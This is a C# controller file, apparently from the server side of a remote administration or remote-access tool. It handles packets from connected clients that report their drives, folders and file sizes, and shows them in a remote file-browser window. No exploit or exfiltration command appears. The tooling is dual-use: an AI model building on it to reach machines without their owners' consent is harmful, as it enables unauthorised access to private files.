using Serveur.Controllers.Server;
using Serveur.Models;
using Serveur.Packets.ClientPackets;
using System.Threading;

namespace Serveur.Controllers
{
    public static class FrmFileManagerController
    {
        private const string DELIMITER = "$E$";
        private static readonly string[] _sizes = { "B", "KB", "MB", "GB" };

        public enum PathType
        {
            File,
            Directory,
            Back
        }

        public static void getDrivesResponse(ClientMosaic client, GetDrivesResponse packet)
        {
            if (client.value == null || client.value.frmFm == null || packet.driveDisplayName == null || packet.rootDirectory == null)
                return;

            if (packet.driveDisplayName.Length != packet.rootDirectory.Length) return;

            RemoteDrive[] drives = new RemoteDrive[packet.driveDisplayName.Length];
            for (int i = 0; i < packet.driveDisplayName.Length; i++)
            {
                drives[i] = new RemoteDrive(packet.driveDisplayName[i], packet.rootDirectory[i]);
            }

            if (client.value != null && client.value.frmFm != null)
            {
                client.value.frmFm.addDrives(drives);
                client.value.frmFm.setStatus("Ready");
            }
        }

        public static void getDirectoryResponse(ClientMosaic client, GetDirectoryResponse packet)
        {
            if(client.value == null || client.value.frmFm == null)
            {
                return;
            }

            new Thread(() =>
            {
                if (client.value.processingDirectory) return;
                client.value.processingDirectory = true;

                client.value.frmFm.clearFileBrowser();
                client.value.frmFm.addItemToFileBrowser("..", "", PathType.Back, 0);

                if (packet.folders != null && packet.folders.Length != 0 && client.value.processingDirectory)
                {
                    for (int i = 0; i < packet.folders.Length; i++)
                    {
                        if (packet.folders[i] != DELIMITER)
                        {
                            if (client.value == null || client.value.frmFm == null || !client.value.processingDirectory)
                                break;

                            client.value.frmFm.addItemToFileBrowser(packet.folders[i], "", PathType.Directory, 1);
                        }
                    }
                }

                if (packet.files != null && packet.files.Length != 0 && client.value.processingDirectory)
                {
                    for (int i = 0; i < packet.files.Length; i++)
                    {
                        if (packet.files[i] != DELIMITER)
                        {
                            if (client.value == null || client.value.frmFm == null || !client.value.processingDirectory)
                                break;

                            client.value.frmFm.addItemToFileBrowser(packet.files[i], getDataSize(packet.filesSize[i]), PathType.File, 4);
                        }
                    }
                }

                if (client.value != null)
                {
                    client.value.receivedLastDirectory = true;
                    client.value.processingDirectory = false;
                    if (client.value.frmFm != null)
                    {
                        client.value.frmFm.setStatus("Ready");
                    }
                }
            }).Start();
        }

        public static string getDataSize(long size)
        {
            double len = size;
            int order = 0;
            while (len >= 1024 && order + 1 < _sizes.Length)
            {
                order++;
                len = len / 1024;
            }
            return string.Format("{0:0.##} {1}", len, _sizes[order]);
        }

        public static void setStatusFileManager(ClientMosaic client, SetStatusFileManager packet)
        {
            if (client.value == null || client.value.frmFm == null) return;

            client.value.frmFm.setStatus(packet.message, packet.setLastDirSeen);
        }
    }
}
